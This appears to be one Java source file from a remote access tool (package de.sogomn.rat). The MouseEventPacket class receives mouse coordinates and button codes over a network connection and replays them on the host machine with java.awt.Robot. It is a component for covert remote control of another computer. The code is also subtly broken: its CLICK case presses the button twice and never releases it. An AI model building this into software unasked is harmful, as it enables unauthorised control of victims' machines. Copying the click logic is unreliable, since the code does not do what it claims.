package de.sogomn.rat.packet;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.MouseEvent;

import de.sogomn.rat.ActiveConnection;

public final class MouseEventPacket implements IPacket {
	
	private int x, y;
	private int button;
	private byte strokeType;
	
	public static final byte PRESS = 0;
	public static final byte RELEASE = 1;
	public static final byte CLICK = 2;
	
	public MouseEventPacket(final int x, final int y, final int button, final byte strokeType) {
		this.x = x;
		this.y = y;
		this.button = button;
		this.strokeType = strokeType;
	}
	
	public MouseEventPacket() {
		this(0, 0, MouseEvent.NOBUTTON, CLICK);
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeInt(x);
		connection.writeInt(y);
		connection.writeInt(button);
		connection.writeByte(strokeType);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		x = connection.readInt();
		y = connection.readInt();
		button = connection.readInt();
		strokeType = connection.readByte();
		
		System.out.println(x + " " + y);
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		try {
			final Robot rob = new Robot();
			
			if (strokeType == PRESS) {
				rob.mouseMove(x, y);
				rob.mousePress(button);
			} else if (strokeType == RELEASE) {
				rob.mouseMove(x, y);
				rob.mouseRelease(button);
			} else if (strokeType == CLICK) {
				rob.mouseMove(x, y);
				rob.mousePress(button);
				rob.mousePress(button);
			}
		} catch (final IllegalArgumentException ex) {
			System.err.println("No valid mouse button");
		} catch (final AWTException ex) {
			ex.printStackTrace();
		}
	}
	
}
